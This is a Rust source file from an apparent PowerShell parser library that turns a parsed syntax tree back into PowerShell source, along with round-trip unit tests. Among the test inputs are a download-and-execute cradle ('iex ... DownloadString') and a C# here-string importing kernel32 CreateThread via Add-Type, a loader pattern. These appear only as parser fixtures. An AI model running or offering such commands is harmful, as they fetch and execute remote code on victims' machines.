//! Reconstruct ("unparse") an [`AstNode`] tree back into PowerShell source.
//!
//! This is mainly a debugging tool. Parse a script, unparse the result, and
//! diff it against the original to see how the parser read the input. Where the
//! reconstruction differs, the parser dropped or reshaped something at that
//! spot.
//!
//! ```no_run
//! use std::fs::File;
//! # fn read() -> String { String::new() }
//! let source = read();
//! let mut f = File::create("dump.ps1").unwrap();
//! poshtree::unparse::dump_ast_to_ps1(&source, &mut f);
//! ```
//!
//! The output is meant to re-parse cleanly rather than match the original byte
//! for byte. The tree does not keep exact whitespace, comments, or every
//! original spelling, so leaf tokens are emitted from their captured `raw` text
//! when it is available and re-synthesised otherwise.

use std::io::Write;

use crate::v1::ast::{AstNode, Attribute, Command, ScriptBlock, StringLiteral};
use crate::v1::parser::parse;

const INDENT: &str = "    ";

/// Parse `source` and write the reconstructed PowerShell to `writer`.
///
/// Mirrors the host project's `dump_ast` but emits runnable source
/// rather than an indented node tree. Parse errors are tolerated (the partial
/// tree, with any `ErrorNode`s rendered from their raw text, is still emitted).
pub fn dump_ast_to_ps1(source: &str, writer: &mut impl Write) {
    let _ = write!(writer, "{}", unparse_source(source));
}

/// Parse `source` and return the reconstructed PowerShell as a string.
pub fn unparse_source(source: &str) -> String {
    let (tree, _) = parse(source);
    unparse(&tree)
}

/// Reconstruct a parsed [`ScriptBlock`] into PowerShell source.
pub fn unparse(tree: &ScriptBlock) -> String {
    let mut out = String::new();
    emit_block(tree, 0, &mut out);
    out
}

// Statement / block layer (multi-line, indented)

fn emit_block(sb: &ScriptBlock, depth: usize, out: &mut String) {
    let pad = INDENT.repeat(depth);
    if let Some(pb) = &sb.param_block {
        out.push_str(&pad);
        out.push_str(&emit_inline(pb));
        out.push('\n');
    }
    for stmt in &sb.statements {
        emit_stmt(stmt, depth, out);
    }
}

fn emit_block_opt(sb: Option<&ScriptBlock>, depth: usize, out: &mut String) {
    if let Some(sb) = sb {
        emit_block(sb, depth, out);
    }
}

fn emit_stmt(node: &AstNode, depth: usize, out: &mut String) {
    let pad = INDENT.repeat(depth);
    match node {
        AstNode::IfStatement(n) => {
            for (i, (cond, body)) in n.clauses.iter().enumerate() {
                let kw = if i == 0 { "if" } else { "elseif" };
                out.push_str(&format!("{pad}{kw} ({}) {{\n", emit_inline(cond)));
                emit_block(body, depth + 1, out);
                out.push_str(&format!("{pad}}}\n"));
            }
            if let Some(eb) = &n.else_body {
                out.push_str(&format!("{pad}else {{\n"));
                emit_block(eb, depth + 1, out);
                out.push_str(&format!("{pad}}}\n"));
            }
        }
        AstNode::WhileStatement(n) => {
            let cond = emit_inline_opt(n.condition.as_deref());
            if n.do_while {
                let kw = if n.until { "until" } else { "while" };
                out.push_str(&format!("{pad}do {{\n"));
                emit_block_opt(n.body.as_ref(), depth + 1, out);
                out.push_str(&format!("{pad}}} {kw} ({cond})\n"));
            } else {
                let kw = if n.until { "until" } else { "while" };
                out.push_str(&format!("{pad}{kw} ({cond}) {{\n"));
                emit_block_opt(n.body.as_ref(), depth + 1, out);
                out.push_str(&format!("{pad}}}\n"));
            }
        }
        AstNode::ForStatement(n) => {
            out.push_str(&format!(
                "{pad}for ({}; {}; {}) {{\n",
                emit_inline_opt(n.initializer.as_deref()),
                emit_inline_opt(n.condition.as_deref()),
                emit_inline_opt(n.iterator.as_deref()),
            ));
            emit_block_opt(n.body.as_ref(), depth + 1, out);
            out.push_str(&format!("{pad}}}\n"));
        }
        AstNode::ForEachStatement(n) => {
            out.push_str(&format!(
                "{pad}foreach ({} in {}) {{\n",
                emit_inline_opt(n.variable.as_deref()),
                emit_inline_opt(n.enumerable.as_deref()),
            ));
            emit_block_opt(n.body.as_ref(), depth + 1, out);
            out.push_str(&format!("{pad}}}\n"));
        }
        AstNode::SwitchStatement(n) => {
            out.push_str(&format!(
                "{pad}switch ({}) {{\n",
                emit_inline_opt(n.condition.as_deref())
            ));
            emit_block_opt(n.body.as_ref(), depth + 1, out);
            out.push_str(&format!("{pad}}}\n"));
        }
        AstNode::TryStatement(n) => {
            out.push_str(&format!("{pad}try {{\n"));
            emit_block_opt(n.body.as_ref(), depth + 1, out);
            out.push_str(&format!("{pad}}}\n"));
            for c in &n.catches {
                out.push_str(&format!("{pad}catch {{\n"));
                emit_block(c, depth + 1, out);
                out.push_str(&format!("{pad}}}\n"));
            }
            if let Some(f) = &n.finally_body {
                out.push_str(&format!("{pad}finally {{\n"));
                emit_block(f, depth + 1, out);
                out.push_str(&format!("{pad}}}\n"));
            }
        }
        AstNode::FunctionDefinition(n) => {
            out.push_str(&format!("{pad}{} {} {{\n", n.kind, n.name));
            emit_block_opt(n.body.as_ref(), depth + 1, out);
            out.push_str(&format!("{pad}}}\n"));
        }
        AstNode::ClassDefinition(n) => {
            let bases = if n.bases.is_empty() {
                String::new()
            } else {
                format!(" : {}", n.bases.join(", "))
            };
            out.push_str(&format!("{pad}class {}{} {{\n", n.name, bases));
            for m in &n.members {
                emit_stmt(m, depth + 1, out);
            }
            out.push_str(&format!("{pad}}}\n"));
        }
        AstNode::ClassMember(n) => {
            let mut prefix = String::new();
            for a in &n.attributes {
                prefix.push_str(&format!("[{}] ", render_attribute(a)));
            }
            for m in &n.modifiers {
                prefix.push_str(m);
                prefix.push(' ');
            }
            if !n.type_name.is_empty() {
                prefix.push_str(&format!("[{}] ", n.type_name));
            }
            if n.member_kind == "property" {
                let init = match &n.default {
                    Some(d) => format!(" = {}", emit_inline(d)),
                    None => String::new(),
                };
                out.push_str(&format!("{pad}{prefix}${}{init}\n", n.name));
            } else {
                let params: Vec<String> = n.parameters.iter().map(emit_inline).collect();
                out.push_str(&format!(
                    "{pad}{prefix}{}({}) {{\n",
                    n.name,
                    params.join(", ")
                ));
                emit_block_opt(n.body.as_ref(), depth + 1, out);
                out.push_str(&format!("{pad}}}\n"));
            }
        }
        AstNode::EnumDefinition(n) => {
            out.push_str(&format!("{pad}enum {} {{\n", n.name));
            let inner = INDENT.repeat(depth + 1);
            for m in &n.members {
                out.push_str(&format!("{inner}{}\n", emit_inline(m)));
            }
            out.push_str(&format!("{pad}}}\n"));
        }
        // Everything else is a single (possibly here-string-multiline) statement.
        other => {
            out.push_str(&pad);
            out.push_str(&emit_inline(other));
            out.push('\n');
        }
    }
}

// Expression layer (single line, complete, unbounded)

fn emit_inline(node: &AstNode) -> String {
    match node {
        // leaves: prefer captured raw text so the round-trip is exact
        AstNode::Variable(n) => {
            if n.raw.is_empty() {
                format!("${}", n.name)
            } else {
                n.raw.clone()
            }
        }
        AstNode::StringLiteral(n) => string_source(n),
        AstNode::NumberLiteral(n) => {
            if n.raw.is_empty() {
                n.value.map(|v| v.to_string()).unwrap_or_default()
            } else {
                n.raw.clone()
            }
        }
        AstNode::BareWord(n) => n.value.clone(),
        AstNode::TypeExpression(n) => format!("[{}]", n.name),
        AstNode::ErrorNode(n) => n.raw.clone(),

        // expressions
        AstNode::CastExpression(n) => format!("[{}]{}", n.type_name, emit_inline(&n.expression)),
        AstNode::MemberAccess(n) => format!(
            "{}{}{}",
            emit_inline(&n.target),
            if n.null_conditional {
                "?."
            } else if n.is_static {
                "::"
            } else {
                "."
            },
            member_name(&n.member, n.member_expr.as_deref()),
        ),
        AstNode::InvokeMember(n) => format!(
            "{}{}{}({})",
            emit_inline(&n.target),
            if n.null_conditional {
                "?."
            } else if n.is_static {
                "::"
            } else {
                "."
            },
            member_name(&n.member, n.member_expr.as_deref()),
            join_inline(&n.arguments, ", "),
        ),
        AstNode::IndexExpression(n) => {
            format!(
                "{}{}{}]",
                emit_inline(&n.target),
                if n.null_conditional { "?[" } else { "[" },
                emit_inline_opt(n.index.as_deref())
            )
        }
        AstNode::BinaryExpression(n) => format!(
            "{} {} {}",
            emit_inline(&n.left),
            n.operator,
            emit_inline(&n.right)
        ),
        AstNode::TernaryExpression(n) => format!(
            "{} ? {} : {}",
            emit_inline(&n.condition),
            emit_inline(&n.if_true),
            emit_inline(&n.if_false)
        ),
        AstNode::PipelineChain(n) => format!(
            "{} {} {}",
            emit_inline(&n.left),
            n.operator,
            emit_inline(&n.right)
        ),
        AstNode::UnaryExpression(n) => {
            if n.postfix {
                format!("{}{}", emit_inline(&n.operand), n.operator)
            } else {
                format!("{}{}", n.operator, emit_inline(&n.operand))
            }
        }
        AstNode::ParenExpression(n) => format!("({})", emit_inline(&n.expression)),
        AstNode::SubExpression(n) => format!("$({})", block_body_inline(&n.body)),
        AstNode::ArrayExpression(n) => format!("@({})", join_inline(&n.elements, ", ")),
        AstNode::ArrayLiteral(n) => join_inline(&n.elements, ", "),
        AstNode::HashtableExpression(n) => {
            let entries: Vec<String> = n
                .entries
                .iter()
                .map(|(k, v)| format!("{} = {}", emit_inline(k), emit_inline(v)))
                .collect();
            if entries.is_empty() {
                "@{}".to_owned()
            } else {
                format!("@{{ {} }}", entries.join("; "))
            }
        }
        AstNode::ScriptBlockExpression(n) => block_inline(&n.body),

        // command / pipeline / assignment
        AstNode::Command(n) => command_inline(n),
        AstNode::CommandParameter(n) => match &n.argument {
            Some(arg) => format!("-{} {}", n.name, emit_inline(arg)),
            None => format!("-{}", n.name),
        },
        AstNode::Pipeline(n) => join_inline(&n.elements, " | "),
        AstNode::AssignmentStatement(n) => format!(
            "{} {} {}",
            emit_inline_opt(n.target.as_deref()),
            n.operator,
            emit_inline_opt(n.value.as_deref())
        ),
        AstNode::ReturnStatement(n) => match &n.value {
            Some(v) => format!("return {}", emit_inline(v)),
            None => "return".to_owned(),
        },
        AstNode::ThrowStatement(n) => match &n.value {
            Some(v) => format!("throw {}", emit_inline(v)),
            None => "throw".to_owned(),
        },
        AstNode::FlowStatement(n) => n.keyword.clone(),
        AstNode::ParamBlock(n) => format!("param({})", join_inline(&n.parameters, ", ")),

        // control flow in expression position is uncommon, so emit a compact form
        AstNode::IfStatement(n) => {
            let mut s = String::new();
            for (i, (cond, body)) in n.clauses.iter().enumerate() {
                let kw = if i == 0 { "if" } else { " elseif" };
                s.push_str(&format!(
                    "{kw} ({}) {}",
                    emit_inline(cond),
                    block_inline(body)
                ));
            }
            if let Some(eb) = &n.else_body {
                s.push_str(&format!(" else {}", block_inline(eb)));
            }
            s
        }
        AstNode::WhileStatement(n) => {
            let cond = emit_inline_opt(n.condition.as_deref());
            let kw = if n.until { "until" } else { "while" };
            if n.do_while {
                format!("do {} {kw} ({cond})", block_inline_opt(n.body.as_ref()))
            } else {
                format!("{kw} ({cond}) {}", block_inline_opt(n.body.as_ref()))
            }
        }
        AstNode::ForStatement(n) => format!(
            "for ({}; {}; {}) {}",
            emit_inline_opt(n.initializer.as_deref()),
            emit_inline_opt(n.condition.as_deref()),
            emit_inline_opt(n.iterator.as_deref()),
            block_inline_opt(n.body.as_ref()),
        ),
        AstNode::ForEachStatement(n) => format!(
            "foreach ({} in {}) {}",
            emit_inline_opt(n.variable.as_deref()),
            emit_inline_opt(n.enumerable.as_deref()),
            block_inline_opt(n.body.as_ref()),
        ),
        AstNode::SwitchStatement(n) => format!(
            "switch ({}) {}",
            emit_inline_opt(n.condition.as_deref()),
            block_inline_opt(n.body.as_ref()),
        ),
        AstNode::TryStatement(n) => {
            let mut s = format!("try {}", block_inline_opt(n.body.as_ref()));
            for c in &n.catches {
                s.push_str(&format!(" catch {}", block_inline(c)));
            }
            if let Some(f) = &n.finally_body {
                s.push_str(&format!(" finally {}", block_inline(f)));
            }
            s
        }
        AstNode::FunctionDefinition(n) => {
            format!(
                "{} {} {}",
                n.kind,
                n.name,
                block_inline_opt(n.body.as_ref())
            )
        }
        AstNode::ScriptBlock(n) => block_inline(n),

        AstNode::UsingStatement(n) => {
            if n.kind.is_empty() {
                format!("using {}", n.name)
            } else {
                format!("using {} {}", n.kind, n.name)
            }
        }
        AstNode::ClassDefinition(n) => {
            let bases = if n.bases.is_empty() {
                String::new()
            } else {
                format!(" : {}", n.bases.join(", "))
            };
            format!("class {}{} {{ … }}", n.name, bases)
        }
        AstNode::EnumDefinition(n) => format!("enum {} {{ … }}", n.name),
        AstNode::ClassMember(n) => {
            let t = if n.type_name.is_empty() {
                String::new()
            } else {
                format!("[{}] ", n.type_name)
            };
            if n.member_kind == "property" {
                format!("{t}${}", n.name)
            } else {
                format!("{t}{}(…)", n.name)
            }
        }

        // Derived metadata that lives in the tree as a child of its `Command`.
        // `command_inline` emits the command from its own elements and never
        // recurses here, so this arm is only a fallback.
        AstNode::CSharpMemberDef(n) => format!("<# C# member def: {} chars #>", n.code.len()),
    }
}

fn emit_inline_opt(node: Option<&AstNode>) -> String {
    node.map(emit_inline).unwrap_or_default()
}

fn join_inline(nodes: &[AstNode], sep: &str) -> String {
    nodes.iter().map(emit_inline).collect::<Vec<_>>().join(sep)
}

/// Re-render a parsed [`Attribute`] as `Name`, `Name()`, or `Name(args...)`.
fn render_attribute(a: &Attribute) -> String {
    if !a.paren {
        return a.name.clone();
    }
    let mut args: Vec<String> = a.positional.clone();
    args.extend(a.named.iter().map(|(k, v)| format!("{k} = {v}")));
    format!("{}({})", a.name, args.join(", "))
}

fn member_name(member: &str, member_expr: Option<&AstNode>) -> String {
    if member.is_empty() {
        emit_inline_opt(member_expr)
    } else {
        member.to_owned()
    }
}

fn command_inline(c: &Command) -> String {
    let mut parts = Vec::new();
    if let Some(op) = c.invocation_operator.as_deref().filter(|s| !s.is_empty()) {
        parts.push(op.to_owned());
    }
    if !c.name.is_empty() {
        parts.push(c.name.clone());
    } else if let Some(ne) = c.name_expr.as_deref() {
        parts.push(emit_inline(ne));
    }
    parts.extend(c.elements.iter().map(emit_inline));
    let mut s = parts
        .into_iter()
        .filter(|p| !p.is_empty())
        .collect::<Vec<_>>()
        .join(" ");
    for r in &c.redirections {
        s.push(' ');
        s.push_str(&r.operator);
        if let Some(t) = &r.target {
            s.push(' ');
            s.push_str(&emit_inline(t));
        }
    }
    s
}

/// Statements of a block joined for an inline `{ ... }` / `$( ... )` context.
fn block_body_inline(sb: &ScriptBlock) -> String {
    let mut parts = Vec::new();
    if let Some(pb) = &sb.param_block {
        parts.push(emit_inline(pb));
    }
    parts.extend(sb.statements.iter().map(emit_inline));
    parts.join("; ")
}

fn block_inline(sb: &ScriptBlock) -> String {
    let body = block_body_inline(sb);
    if body.is_empty() {
        "{ }".to_owned()
    } else {
        format!("{{ {body} }}")
    }
}

fn block_inline_opt(sb: Option<&ScriptBlock>) -> String {
    sb.map(block_inline).unwrap_or_else(|| "{ }".to_owned())
}

/// Re-emit a string literal as source: the captured `raw` when available,
/// otherwise re-quoted from the decoded value according to its kind.
fn string_source(s: &StringLiteral) -> String {
    if !s.raw.is_empty() {
        return s.raw.clone();
    }
    match s.kind.as_str() {
        "single" => format!("'{}'", s.value.replace('\'', "''")),
        "here_double" => format!("@\"\n{}\n\"@", s.value),
        "here_single" => format!("@'\n{}\n'@", s.value),
        // double-quoted: backtick-escape the quote and the escape char itself
        _ => format!("\"{}\"", s.value.replace('`', "``").replace('"', "`\"")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::v1::ast::AstNode;

    /// True when `src` re-parses with no errors and no `ErrorNode`s.
    fn reparses_clean(src: &str) -> bool {
        let (tree, errors) = parse(src);
        if !errors.is_empty() {
            return false;
        }
        let mut ok = true;
        AstNode::ScriptBlock(tree).walk(&mut |n| {
            if matches!(n, AstNode::ErrorNode(_)) {
                ok = false;
            }
        });
        ok
    }

    #[test]
    fn roundtrip_reparses_cleanly() {
        let snippets = [
            "$x = 1 + 2 * 3",
            "Get-Process | Where-Object Name | Select-Object -First 1",
            "if ($a -gt 1) { Write-Host 'big' } elseif ($a -eq 1) { 'one' } else { 'small' }",
            "foreach ($i in 1..3) { $i }",
            "for ($i = 0; $i -lt 10; $i++) { $i }",
            "try { risky } catch { 'oops' } finally { 'done' }",
            "function Get-Thing { param($a) return $a + 1 }",
            "$h = @{ name = 'a'; count = 3 }",
            "[Math]::Max(1, 2)",
            "$arr = @(1, 2, 3)",
            "iex (New-Object Net.WebClient).DownloadString('http://x/y')",
        ];
        for s in snippets {
            let recon = unparse_source(s);
            assert!(
                reparses_clean(&recon),
                "reconstruction did not re-parse cleanly\n--- input ---\n{s}\n--- output ---\n{recon}"
            );
        }
    }

    #[test]
    fn roundtrip_is_idempotent() {
        // unparse(parse(x)) should be a fixed point: unparsing it again is stable.
        let src = "function F { param($n) if ($n -gt 0) { return $n * 2 } else { 0 } }";
        let once = unparse_source(src);
        let twice = unparse_source(&once);
        assert_eq!(
            once, twice,
            "second round-trip diverged:\n{once}\n vs \n{twice}"
        );
    }

    #[test]
    fn roundtrip_preserves_here_string_and_add_type() {
        // The reported snippet's shape: a here-string of C# assigned, then Add-Type.
        let src = "$Win32 = @\"\nusing System;\npublic class Win32 {\n[DllImport(\"kernel32\")]\npublic static extern IntPtr CreateThread(IntPtr a);\n}\n\"@\nAdd-Type $Win32";
        let recon = unparse_source(src);
        assert!(
            recon.contains("Add-Type $Win32"),
            "lost the Add-Type call:\n{recon}"
        );
        assert!(
            recon.contains("CreateThread"),
            "lost here-string body:\n{recon}"
        );
        assert!(
            recon.contains("@\""),
            "lost the here-string opener:\n{recon}"
        );
        // and it still re-parses cleanly
        assert!(reparses_clean(&recon), "did not re-parse:\n{recon}");
    }

    #[test]
    fn dump_writes_to_writer() {
        let mut buf: Vec<u8> = Vec::new();
        dump_ast_to_ps1("$x = 1", &mut buf);
        let s = String::from_utf8(buf).unwrap();
        assert!(s.contains("$x = 1"), "unexpected dump: {s:?}");
    }
}
